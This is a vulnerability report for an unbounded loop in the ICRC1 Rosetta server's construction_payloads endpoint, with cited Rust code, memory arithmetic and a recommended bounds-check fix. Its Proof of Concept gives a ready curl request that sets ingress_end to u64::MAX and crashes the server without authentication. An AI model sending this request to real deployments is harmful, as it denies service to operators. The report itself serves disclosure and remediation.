### Title
Unbounded `ingress_end` Allows OOM DoS in ICRC1 Rosetta `construction_payloads` — (`rs/rosetta-api/icrc1/src/construction_api/services.rs`)

### Summary

The `construction_payloads` function in the ICRC1 Rosetta server accepts a user-supplied `ingress_end: u64` with no upper-bound validation. The function then enters a `while` loop that pushes one entry per step until `ingress_start` reaches `ingress_end`. With `ingress_end = u64::MAX`, the loop runs ~140 billion iterations, exhausting server memory and crashing the process.

### Finding Description

In `rs/rosetta-api/icrc1/src/construction_api/services.rs`, the `construction_payloads` function reads `ingress_end` directly from attacker-controlled JSON metadata: [1](#0-0) 

The only guards applied are: [2](#0-1) 

Neither check bounds `ingress_end` from above. The function then enters an unbounded loop: [3](#0-2) 

The step size per iteration is:

```
ingress_interval - INGRESS_INTERVAL_OVERLAP
= (MAX_INGRESS_TTL - PERMITTED_DRIFT) - INGRESS_INTERVAL_OVERLAP
= (300s - 60s) - 120s
= 120 seconds = 120_000_000_000 nanoseconds
``` [4](#0-3) [5](#0-4) 

With `ingress_end = u64::MAX ≈ 1.84 × 10¹⁹ ns` and `now ≈ 1.7 × 10¹⁸ ns` (year 2024):

```
iterations ≈ (u64::MAX - now) / 120_000_000_000
           ≈ 1.67 × 10¹⁹ / 1.2 × 10¹¹
           ≈ ~139 billion iterations
```

Each iteration pushes a `u64` (8 bytes) into `ingress_expiries`. Total allocation: **~1.1 TB**, causing OOM. The same structural flaw exists in the ICP Rosetta server: [6](#0-5) 

### Impact Explanation

The ICRC1 Rosetta server process is killed by the OS OOM killer (or panics on allocation failure) before returning a response. Any operator running the Rosetta server as a gateway for ICRC1 transfers is fully denied service. No authentication is required to trigger this.

### Likelihood Explanation

The `/construction/payloads` endpoint is a public HTTP endpoint. A single unauthenticated POST request with `"ingress_end": 18446744073709551615` in the JSON body is sufficient to trigger the crash. No special knowledge beyond the Rosetta API spec is needed.

### Recommendation

Add an explicit upper-bound check immediately after parsing `ingress_end`, before the loop:

```rust
const MAX_INGRESS_WINDOW: u64 = 24 * 60 * 60 * 1_000_000_000; // e.g. 24 hours in ns
if ingress_end.saturating_sub(ingress_start) > MAX_INGRESS_WINDOW {
    return Err(Error::processing_construction_failed(
        "ingress_end - ingress_start exceeds maximum allowed window"
    ));
}
```

Apply the same fix to `rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`.

### Proof of Concept

```bash
curl -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"<ledger-id>"},
    "operations": [<valid transfer operation>],
    "public_keys": [<valid public key>],
    "metadata": {
      "ingress_start": 1700000000000000000,
      "ingress_end": 18446744073709551615
    }
  }'
# Server OOMs and crashes before responding.
```

### Citations

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L133-136)
```rust
    let ingress_end = metadata
        .as_ref()
        .and_then(|meta| meta.ingress_end)
        .unwrap_or(ingress_start + ingress_interval);
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L162-167)
```rust
    let mut ingress_expiries = vec![];
    while ingress_start < ingress_end {
        ingress_expiries.push(ingress_start + ingress_interval);
        ingress_start +=
            ingress_interval.saturating_sub(INGRESS_INTERVAL_OVERLAP.as_nanos() as u64);
    }
```

**File:** rs/rosetta-api/icrc1/src/common/constants.rs (L19-19)
```rust
pub const INGRESS_INTERVAL_OVERLAP: Duration = Duration::from_secs(120);
```

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```
